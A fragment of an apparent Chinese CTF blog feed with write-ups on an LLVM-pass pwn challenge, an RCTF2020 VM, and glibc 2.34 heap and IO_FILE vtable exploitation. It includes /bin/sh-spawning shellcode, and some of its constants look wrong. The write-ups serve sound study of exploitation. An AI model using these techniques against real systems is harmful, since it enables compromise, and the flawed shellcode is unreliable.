class=\"line\">  %4 = add nsw i64 %0, 6</span><br><span class=\"line\">  %5 = add nsw i64 %4, -204</span><br><span class=\"line\">  %6 = add nsw i64 %5, %3</span><br><span class=\"line\">  ret i64 %6</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```</span><br><span class=\"line\">### IR after optimization</span><br><span class=\"line\">```</span><br><span class=\"line\">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class=\"line\">  %2 = mul i64 %0, 2</span><br><span class=\"line\">  %3 = add i64 %2, -132</span><br><span class=\"line\">  ret i64 %3</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">```</span><br></pre></td></tr></table></figure>\n<p>opt-12 对应的就是 llvm-12，而且题目没有给出 opt。有师傅讲 ubuntu18 是不支持 opt-12 的。</p>\n<p>我们看看程序是如何优化代码的，在 handle 部分，有几个点，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v30 = *((_QWORD *)this + <span class=\"number\">4</span>) + <span class=\"number\">0xFF0</span>LL;        <span class=\"comment\">// shellcode结束的地方，0x***ff0</span></span><br></pre></td></tr></table></figure>\n<p>这里的 v30 就是指定了我们结束的空间，用来下面判断是会溢出超出这个区域。下面有三个分支，但是我们的目标是最后一个 else</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span>                                          <span class=\"comment\">// 真实的优化过程</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;anonymous namespace&#x27;</span>::MBAPass::writeMovImm64(this, <span class=\"number\">0</span>, <span class=\"number\">0LL</span>);<span class=\"comment\">// 在最开始的地方写movabs rax,0x0</span></span><br><span class=\"line\">    *((_DWORD *)this + <span class=\"number\">12</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;llvm::Value *&gt;::<span class=\"built_in\">stack</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">deque</span>&lt;llvm::Value *&gt;,<span class=\"type\">void</span>&gt;(v26);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;<span class=\"type\">int</span>&gt;::<span class=\"built_in\">stack</span>&lt;<span class=\"built_in\">std</span>::<span class=\"built_in\">deque</span>&lt;<span class=\"type\">int</span>&gt;,<span class=\"type\">void</span>&gt;(<span class=\"built_in\">stack</span>);</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;llvm::Value *&gt;::push(v26, &amp;v27);</span><br><span class=\"line\">    v24 = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">stack</span>&lt;<span class=\"type\">int</span>&gt;::push(<span class=\"built_in\">stack</span>, &amp;v24);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( *((_QWORD *)this + <span class=\"number\">5</span>) &lt; v30 )</span><br></pre></td></tr></table></figure>\n<p>执行完 *（this+12） = 0 后的情况是在这样的</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612213526191.png\" alt=\"image-20220612213526191\"></p>\n<p>this+12 指向的是 0x4c8d70 四字节。0x4c8c68 是记录当前我们要写入指令的位置。</p>\n<p>writeMovImm64 (this, 0, 0LL)，第二个参数指定寄存器，0 为 rax，1 为 rbx，0LL 是 64 位立即数。同理 writeret 就是向木匾位置写入 ret (0xc3)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> RDI  <span class=\"number\">0x4c8c40</span> —▸ <span class=\"number\">0x7ffff21dbd30</span> —▸ <span class=\"number\">0x7ffff21cded0</span> ◂— push   rbp</span><br><span class=\"line\"> RSI  <span class=\"number\">0x48af78</span> —▸ <span class=\"number\">0x4ddf80</span> —▸ <span class=\"number\">0x7fffffffd560</span> —▸ <span class=\"number\">0x4b3820</span> —▸ <span class=\"number\">0x4b3840</span> ◂— ...</span><br><span class=\"line\"> R8   <span class=\"number\">0x4def70</span> ◂— <span class=\"number\">0x637566</span> <span class=\"comment\">/* &#x27;fuc&#x27; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">28</span>gx <span class=\"number\">0x48af78</span><span class=\"number\">-0x18</span></span><br><span class=\"line\"><span class=\"number\">0x48af60</span>:\t<span class=\"number\">0x0000000000000040</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x48af70</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000004ddf80</span></span><br><span class=\"line\"><span class=\"number\">0x48af80</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x5000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x48af90</span>:\t<span class=\"number\">0x00000000004ddf50</span>\t<span class=\"number\">0x0000000000004000</span></span><br><span class=\"line\"><span class=\"number\">0x48afa0</span>:\t<span class=\"number\">0x00000000004dbc30</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x48afb0</span>:\t<span class=\"number\">0x00000000004dbc48</span>\t<span class=\"number\">0x00000000004dbc48</span></span><br><span class=\"line\"><span class=\"number\">0x48afc0</span>:\t<span class=\"number\">0x00000000004df4d8</span>\t<span class=\"number\">0x00000000004df4d8</span></span><br><span class=\"line\"><span class=\"number\">0x48afd0</span>:\t<span class=\"number\">0x00000000004df490</span>\t<span class=\"number\">0x0000000000000001</span></span><br><span class=\"line\"><span class=\"number\">0x48afe0</span>:\t<span class=\"number\">0x00000000004ddec0</span>\t<span class=\"number\">0x00000000004de308</span></span><br><span class=\"line\"><span class=\"number\">0x48aff0</span>:\t<span class=\"number\">0x00000000000000bc</span>\t<span class=\"number\">0x0000000000000051</span></span><br><span class=\"line\"><span class=\"number\">0x48b000</span>:\t<span class=\"number\">0x00007fff00000000</span>\t<span class=\"number\">0x000000000048c410</span></span><br><span class=\"line\"><span class=\"number\">0x48b010</span>:\t<span class=\"number\">0x000000000048b120</span>\t<span class=\"number\">0x000000000048acf0</span></span><br><span class=\"line\"><span class=\"number\">0x48b020</span>:\t<span class=\"number\">0x000000000048b030</span>\t<span class=\"number\">0x000000000000000a</span></span><br><span class=\"line\"><span class=\"number\">0x48b030</span>:\t<span class=\"number\">0x766e6f6761786568</span>\t<span class=\"number\">0xffffffffff003536</span></span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>关于 handle 函数貌似并没有进行的优化，而是对原有的文件的处理，使用的是堆栈将原来的程序倒序储存进空间内。但是他这里的程序使用的汇编的指令比较少，add，sub，movabs，mul，dec，inc，rax 依旧是程序的返回值，所以最开始一定是对 rax 的初始化。程序的漏洞在于我们可用于储存指令的空间只有 0xff0，但是 mprotect 设置的是 0x1000. 而且程序在防止我们超出空间的时候检查是否小于 X+0xff0，但是如果我们控制知名的长度，将这个位置恰好覆盖为 shellcode。我们在写 add,sub 的汇编时，程序会将其全部转为 mov rbx,xxx,add rax,rbx. 我们可向内存中写入 8 字节的 64 位数，我们可以利用这个。在汇编中 \\xeb 对应的指令默认的偏移量时 2，\\xeb\\x00 jmp 2. 结合上述，我们在第一个函数的结尾，向 0xff0 布置一个 i64, 使其跳转到某个存有 i64 的内存位置。我们通过这样多次跳转一步步完成 shellcoe 的布局，每次跳转栈两字节，所以每条指令不可以超过 6 字节。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push <span class=\"number\">0x68732f</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">shl rax,<span class=\"number\">0x20</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">add rax,<span class=\"number\">0x6069622f</span></span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">push rax</span><br><span class=\"line\">mov rdi,rsp</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">xor rdx,rdx</span><br><span class=\"line\">push <span class=\"number\">0x39</span></span><br><span class=\"line\">jmp $?</span><br><span class=\"line\"></span><br><span class=\"line\">xor rsi,rsi</span><br><span class=\"line\">pop rax</span><br><span class=\"line\">syscall</span><br></pre></td></tr></table></figure>\n<p>RCTF2020</p>\n<p>直接给出了手写的 vm 可执行程序，我们需要理清楚里面的函数逻辑。重点在与子进程中的两个函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums_IR = sub_1A75(file);                   // 解析我们输入的数据</span><br><span class=\"line\">   sub_E99(file, nums_IR);</span><br></pre></td></tr></table></figure>\n<p>首先当我们输入某种编码形式的指令后，第一个函数会检查我们的输入是否合法，并计算出我们输入了多少条完整的指令。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">解析输入是否合法的时候，有一些op码，大致县分为三块，小于9，等于9以及大于9小于</span><br><span class=\"line\">0\t1\t2\t3三条指令，根据下1字节的标志，1：有一个寄存器和8字节的数据，0：两个寄存器</span><br><span class=\"line\">\t0\t\t\t\t\t1:ADD RI,IMM64;\t\t0:ADD RI,RI</span><br><span class=\"line\">\t1\t\t\t\t\t1:SUB RI,IMM64;\t\t0:SUB RI,RI</span><br><span class=\"line\">\t2\t\t\t\t\t1:MUL RI,IMM64;\t\t0:MUL RI,RI</span><br><span class=\"line\">\t3\t\t\t\t\t1:DIV RI IMM64; \t0:DIV RI ,RI</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">4\t有一个标志位字节，条件1下，后面有9字节的任意数据，条件2需要两个寄存器</span><br><span class=\"line\">\t\t1:MOV RI,IMM64\t\t\t;4\t\t\tMOV RI,[IMM64]</span><br><span class=\"line\">\t\t8:MOV RI,RI\t\t\t\t;0X10\t\tMOV RI1,[RI2]</span><br><span class=\"line\">\t\t0X20:MOV [RI1],RI2</span><br><span class=\"line\">5\t一字节的寄存器号。将ptr+0x50 的值设置为寄存器中的值。    jmp ri</span><br><span class=\"line\"></span><br><span class=\"line\">6\t一字节的数据标志位。1：AND RI,IMM64;\t\t0: AND RI,RI</span><br><span class=\"line\">7\tp=1:1B，8B   XOR RI,IMM64;\t\t\tp=0:1B,1B\tXOR RI,RI\t\t\t\t</span><br><span class=\"line\">8\t标志位\t，1：或操作，or ri，imm64  ； 0：两个寄存器或操作，destri为第一个  XOR RI,RI</span><br><span class=\"line\">9\t需要一个寄存器，\t\t\t\t2B长,设置寄存器\t\tNOT RI</span><br><span class=\"line\"></span><br><span class=\"line\">10\t需要一个标志位p,为0或者1，&#123;1的时候，后面又8字节的数据，使得ptr+0x40的指针地址-8，并设置为指针指向的值为value，为0的时候，后面紧跟一个寄存器,&#125;\t\t\t\t\t\t\t\tpush imm64/push ri</span><br><span class=\"line\">11\t检查ptr+88，要求非零，然后标志数值减一，后面还跟着一字节的数据.ptr+64指针指向的数据+8\t\tpop RI</span><br><span class=\"line\"></span><br><span class=\"line\">12\t需要1B的操作数，\t\t\t\t 2BIR\t\t指令跳转。1B的偏移量，默认+2(吓一个指令)</span><br><span class=\"line\">13\t对应一个4字节的value（size）\t\t\t\t5B，ptr+72存的是指针数组，栈，这里会被释放，地址由ptr+92提供数组下标索引,size用于malloc的操作，\t\t\tfree旧的stack，创建一个新的</span><br><span class=\"line\">14\t无操作数\t\t\t\t\t\t\t 1B\t\tNOP</span><br><span class=\"line\"></span><br><span class=\"line\">初步分析，大概有8个寄存器（ (unsigned __int8)getbyte_value(position + 2) &gt; 7u）</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>vm_file 的结构体</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0\t\t\tR0</span><br><span class=\"line\">0x8\t\t\tR1</span><br><span class=\"line\">0x10\t\tR2</span><br><span class=\"line\">0x18\t\tR3</span><br><span class=\"line\">0x20\t\tR4</span><br><span class=\"line\">0x28\t\tR5</span><br><span class=\"line\">0x30\t\tR6</span><br><span class=\"line\">0x38\t\tR7</span><br><span class=\"line\"></span><br><span class=\"line\">0x40\t\tmalloc申请出来的指针 用作rsp</span><br><span class=\"line\">0x48\t\tchunk结束的地方，栈顶的地址\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">0x50\t\tPC</span><br><span class=\"line\">0x58(4B)\t\tmalloc后标记为0，stck是否为空，stack的length</span><br><span class=\"line\">0x5c\t\tchunk的实际空间大小,stack的字节大小</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>stack 是在 pc 之后申请的，通过 jmp 可以将微程序劫持到 vm_stack 上面，一字节的最大跳转时 0xff，pc 为 0x010 大小</p>\n",
            "tags": [
                "Learning"
            ]
        },
        {
            "id": "http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/",
            "url": "http://example.com/2022/06/03/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/",
            "title": "高版本glibc堆的几种利用手法",
            "date_published": "2022-06-03T03:15:34.000Z",
            "content_html": "<h1 id=\"glibc-高版本\"><a class=\"markdownIt-Anchor\" href=\"#glibc-高版本\">#</a> Glibc \t高版本</h1>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言：</h2>\n<p>​\t\t本文旨在讲述在 glibc 2.34ubuntu 高版本下（2.34-0ubuntu3.2）的一些利用手法是否依旧可以使用。会对某些手法进行概括，并没有对其进行深入透彻的讲述。感兴趣的朋友可以自行学习，最后详细介绍了 house of banana.</p>\n<p>我只是站在了前任师傅的高台上，为大家进行一些总结分析。</p>\n<p>​\t\t前不久打算深入的去了解在 2.34 以及 2.35 这两个较高版本的 glibc 的堆漏洞的利用。</p>\n<h2 id=\"234235-如何利用\"><a class=\"markdownIt-Anchor\" href=\"#234235-如何利用\">#</a> 2.34 (2.35) 如何利用</h2>\n<h3 id=\"一些对比\"><a class=\"markdownIt-Anchor\" href=\"#一些对比\">#</a> 一些对比</h3>\n<p>2.34 与 2.35 其实非常接近，一般情况下，我们利用的手法也都是一致的，除了继承了 2.29 以来 的各种保护机制，2.34 开始最大的特点，就是删除了__free_hook</p>\n<p>__malloc_hook</p>\n<p>__realloc_hook</p>\n<p>__memalign_hook</p>\n<p>__after_morecore_hook</p>\n<p>这几个常用的钩子函数，而我们最常用的 malloc_hook 以及 free_hook 被完全的禁止了（虽然我们依旧可以在程序中找到对应的符号，但是相关的函数不在对其进行调用），我们只能另寻出路。其实在 2.29 以后的版本中，很多手法都已经失效了，我们常用的无外乎就是劫持程序执行流，以及输入输出流。在 2.23 的版本中，我们是可以修改 vtable，但是 2.24 后就禁止修改，以及再到后面的一些版本还会检查我们的 vtable 是否在允许的范围中（所有的 vtable 储存在一个数组中，以__start_libc_IO_vtables 开始，__stop_libc_IO_vtables 结束）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_IO_vtable_check (<span class=\"type\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> SHARED</span></span><br><span class=\"line\">  <span class=\"comment\">/* Honor the compatibility flag.  */</span></span><br><span class=\"line\">  <span class=\"type\">void</span> (*flag) (<span class=\"type\">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">  PTR_DEMANGLE (flag);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class=\"line\"><span class=\"comment\">     need to accept foreign vtables because there is always a</span></span><br><span class=\"line\"><span class=\"comment\">     possibility that FILE * objects are passed across the linking</span></span><br><span class=\"line\"><span class=\"comment\">     boundary.  */</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    Dl_info di;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">l</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!rtld_active ()</span><br><span class=\"line\">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class=\"literal\">NULL</span>) != <span class=\"number\">0</span></span><br><span class=\"line\">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>但是，在 2.34 的早期版本又是可以写的（glibc-2.34-0ubuntu1_amd64）</p>\n<p><img data-src=\"p1.jpg\" alt=\"p1\"></p>\n<p>这个时候我们可以尝试攻击 vtable 结构体，达到 getshell 的目的。</p>\n<p>但是在后面的几次更新中，又将修复了这个漏洞，在 (Ubuntu GLIBC 2.34-0ubuntu3.2) 2.34 版本中，就不可以修改（目前已知在 2.340ubuntu3 版本以及之前的版本依旧有可写的权限）</p>\n<p><img data-src=\"p2.png\" alt=\"p2\"></p>\n<p>我们可以找到很多关于如何绕过 vtable check 的办法进行劫持 IO 流，其中最主流的还是利用 _IO_str_jumps  和 _IO_wstr_jumps 两个虚表，</p>\n<p>二者利用几乎一样。我们在源码 /libio/strops.c 可以看到相关的 vatable 的内容，以下我以_IO_str_jumps 作主要说明。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_jump_t</span> _<span class=\"title\">IO_str_jumps</span> <span class=\"title\">libio_vtable</span> =</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  JUMP_INIT_DUMMY,</span><br><span class=\"line\">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class=\"line\">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class=\"line\">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class=\"line\">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class=\"line\">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class=\"line\">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class=\"line\">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class=\"line\">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class=\"line\">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class=\"line\">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class=\"line\">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class=\"line\">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class=\"line\">  JUMP_INIT(read, _IO_default_read),</span><br><span class=\"line\">  JUMP_INIT(write, _IO_default_write),</span><br><span class=\"line\">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class=\"line\">  JUMP_INIT(close, _IO_default_close),</span><br><span class=\"line\">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class=\"line\">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class=\"line\">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里面有两个很有用的函数</p>\n<p>JUMP_INIT(finish, _IO_str_finish),<br>\nJUMP_INIT(overflow, _IO_str_overflow),</p>\n<p>相关源码如下</p>\n<h4 id=\"_io_str_finish\"><a class=\"markdownIt-Anchor\" href=\"#_io_str_finish\">#</a> _IO_str_finish</h4>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Glibc 2.34</span></span><br><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_str_finish (FILE *fp, <span class=\"type\">int</span> dummy)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class=\"line\">    <span class=\"built_in\">free</span> (fp-&gt;_IO_buf_base);</span><br><span class=\"line\">  fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_default_finish (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里我们值得注意的是_IO_str_finish，在之前版本中，函数中其实是存在任意函数执行的漏洞的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Glibc 2.31</span></span><br><span class=\"line\"><span class=\"type\">void</span></span><br><span class=\"line\">_IO_str_finish (_IO_FILE *fp, <span class=\"type\">int</span> dummy)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class=\"line\">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class=\"comment\">//我们控制 _free_buffer 为目标函数，就达到了任意执行</span></span><br><span class=\"line\">  fp-&gt;_IO_buf_base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  _IO_default_finish (fp, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是在新版本的函数中，将这部分删除了，所以我们无法通过这里 getshell.</p>\n<h4 id=\"_io_str_overflow\"><a class=\"markdownIt-Anchor\" href=\"#_io_str_overflow\">#</a> _IO_str_overflow</h4>\n<p>2.34 对比之前的版本，这里并没有太大的变化，但是因为没有了 free_hook 事情变得不容乐观</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\">_IO_str_overflow (FILE *fp, <span class=\"type\">int</span> c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> flush_only = c == EOF;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> pos;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fp-&gt;_flags 